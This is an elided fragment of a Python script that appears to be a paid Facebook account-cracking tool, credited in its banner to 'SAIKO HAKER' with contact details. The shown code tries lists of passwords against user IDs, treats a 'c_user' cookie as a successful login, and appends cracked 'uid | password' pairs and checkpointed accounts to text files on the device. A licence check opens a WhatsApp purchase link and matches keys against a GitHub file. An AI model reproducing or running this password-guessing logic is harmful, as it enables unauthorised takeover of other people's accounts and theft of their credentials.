...
\033[1;32m---------------------------------------------------------
\033[1;32m  AUTHOR    : SAIKO HAKER
\033[1;32m  GITHUB    : JUBU the NOOB
\033[1;32m  FACEBOOK  : Md Nasrullha Jubair
\033[1;32m  WHATSAPP: 01834292903
        ...
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
               ...
               ###### print ('\033[1;36m[‎ ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    cek_apk(session,coki)
        	    open('/sdcard/SAIKO-HAKER.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
              ...
              #  print ('\033[1;32m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/SAIKO-HAKER-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
        	    break          
        	else:
        	    continue
...
def mex():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801834292903?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20AlAmin%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get('https://github.com/JUBUtheNOOB/approval.txt').text
    if key1 in r:
